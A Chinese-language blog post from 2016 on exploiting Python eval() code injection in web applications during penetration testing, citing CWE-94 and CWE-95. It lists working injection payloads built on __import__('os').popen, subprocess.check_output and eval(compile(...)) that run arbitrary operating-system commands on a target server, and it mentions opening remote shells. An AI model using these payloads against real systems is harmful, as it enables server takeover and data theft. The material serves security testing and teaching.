Python 代码实现 Web 应用的注入

Moto • 2016年11月11日 • Web安全, 技术控 • 阅读 1651

易受Python代码注入漏洞影响的Web应用程序，允许您通过应用程序将Python代码发送到目标服务器的Python解释器上。  你可以执行python程序，可以调用操作系统命令，可以运行操作系统的命令，对有权访问的文件进行读/写，甚至可能启动远程交互式shell（例如nc，Metasploit，Empire）。

事情是这样的，最近我需要利用这个进行外部渗透测试。但在网上却很难找到如何从POC到有用的Web应用程序开发的信息。我和我的同事Charlie Worrell将Burp POC（睡眠20秒）转换为非交互式shell，这就是本文包含的内容。

Python代码注入是服务器端代码注入的一个子集，因为此漏洞可能发生在其他语言（例如Perl和Ruby）中。以下是两个有关代码注入的CWE：

  • CWE-94: Improper Control of Generation of Code (‘Code Injection’)
  • CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code (‘Eval Injection’)

漏洞

在网上很难找到一篇关于python eval（）的文章，并且文章没有警告它是不安全的，eval（）是最可能的罪魁祸首。如果存在以下两个条件，则存在此漏洞：、

  1. 应用程序接受用户输入（例如，GET / POST参数、cookie值）
  2. 应用程序以不安全的方式将用户控制的输入传递给eval（没有过滤或其他保护机制）

从PoC到针对性的利用

虽然time.sleep是一种确认漏洞的好方法，但我们希望执行操作系统命令并接收输出。我们利用os.popen（）、subprocess.Popen（）和subprocess.check_output（）做到了这一点，我相信还有其他的方法。

如果你有多个语句，Burp Suite Pro  payload使用一个聪明的hack（使用compile），因为eval只能求值表达式。还有另一种方法来实现这一点，使用全局函数（例如：__import__）。这里进行了解释：戳我、戳我

这个payload在大多数情况下应该工作：

# Example with one expression
__import__('os').popen('COMMAND').read()
# Example with multiple expressions, separated by commas
str("-"*50),__import__('os').popen('COMMAND').read()

如果需要执行语句或多个语句，则必须使用eval / compile：

执行一个语句

eval(compile("""__import__('os').popen(r'COMMAND').read()""",'','single'))
eval(compile("""__import__('subprocess').check_output(r'COMMAND',shell=True)""",'','single'))

执行多个语句的示例，以分号分隔

eval(compile("""__import__('os').popen(r'COMMAND').read();import time;time.sleep(2)""",'','single'))
eval(compile("""__import__('subprocess').check_output(r'COMMAND',shell=True);import time;time.sleep(2)""",'','single'))

在我的测试中，上面使用全局__import__的技巧没有起到作用，像subprocess.Popen。  在这种情况下，只能使用for循环技术：

eval(compile("""for x in range(1):\n import os\n os.popen(r'COMMAND').read()""",'','single'))
eval(compile("""for x in range(1):\n import subprocess\n subprocess.Popen(r'COMMAND',shell=True, stdout=subprocess.PIPE).stdout.read()""",'','single'))
eval(compile("""for x in range(1):\n import subprocess\n subprocess.check_output(r'COMMAND',shell=True)""",'','single'))
